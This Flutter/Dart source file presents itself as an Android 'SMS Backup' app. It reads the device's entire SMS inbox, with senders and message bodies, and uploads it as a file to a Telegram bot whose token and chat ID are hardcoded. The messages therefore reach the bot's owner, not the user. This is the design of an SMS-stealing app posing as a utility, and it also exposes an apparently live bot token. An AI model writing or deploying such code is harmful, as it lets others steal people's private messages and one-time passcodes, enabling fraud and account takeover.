import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:telephony/telephony.dart';
import 'dart:convert';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'SMS Backup',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.purple),
      home: SMSBackupPage(),
    );
  }
}

class SMSBackupPage extends StatefulWidget {
  @override
  _SMSBackupPageState createState() => _SMSBackupPageState();
}

class _SMSBackupPageState extends State<SMSBackupPage> {
  final String botToken = "8859100629:AAFdW_k4Ist35Eiof06w3MPp93S4fzlq8SM";
  final String chatId = "6076447275";
  
  final Telephony telephony = Telephony.instance;
  List<SmsMessage> messages = [];
  bool isLoading = false;
  String status = 'Ready';
  
  @override
  void initState() {
    super.initState();
    requestPermission();
  }
  
  Future<void> requestPermission() async {
    var status = await Permission.sms.request();
    setState(() {
      this.status = status.isGranted ? '✅ Ready' : '❌ Permission denied';
    });
  }
  
  Future<void> readSMS() async {
    setState(() {
      isLoading = true;
      status = 'Reading...';
    });
    
    try {
      List<SmsMessage> smsList = await telephony.getInboxSms();
      setState(() {
        messages = smsList;
        isLoading = false;
        status = '✅ ${smsList.length} messages';
      });
    } catch (e) {
      setState(() {
        isLoading = false;
        status = '❌ Error: $e';
      });
    }
  }
  
  Future<void> sendToTelegram() async {
    if (messages.isEmpty) return;
    
    setState(() {
      isLoading = true;
      status = 'Sending...';
    });
    
    try {
      StringBuffer buffer = StringBuffer();
      buffer.writeln('SMS Backup');
      buffer.writeln('Total: ${messages.length}');
      buffer.writeln('=' * 40);
      
      for (var msg in messages) {
        buffer.writeln('From: ${msg.address}');
        buffer.writeln('${msg.body}');
        buffer.writeln('-' * 30);
      }
      
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$botToken/sendDocument')
      );
      
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = '📱 ${messages.length} messages';
      request.files.add(
        http.MultipartFile.fromString(
          'document',
          buffer.toString(),
          filename: 'sms_backup.txt',
        )
      );
      
      var response = await request.send();
      var result = json.decode(await response.stream.bytesToString());
      
      setState(() {
        isLoading = false;
        status = result['ok'] == true ? '✅ Sent!' : '❌ Failed';
      });
    } catch (e) {
      setState(() {
        isLoading = false;
        status = '❌ Error: $e';
      });
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('📱 SMS Backup'), centerTitle: true),
      body: Padding(
        padding: EdgeInsets.all(20),
        child: Column(
          children: [
            Text(status, style: TextStyle(fontSize: 18)),
            SizedBox(height: 20),
            if (isLoading) CircularProgressIndicator(),
            SizedBox(height: 20),
            ElevatedButton(
              onPressed: isLoading ? null : readSMS,
              child: Text('Read SMS'),
            ),
            SizedBox(height: 10),
            ElevatedButton(
              onPressed: (isLoading || messages.isEmpty) ? null : sendToTelegram,
              child: Text('Send to Telegram'),
            ),
          ],
        ),
      ),
    );
  }
}
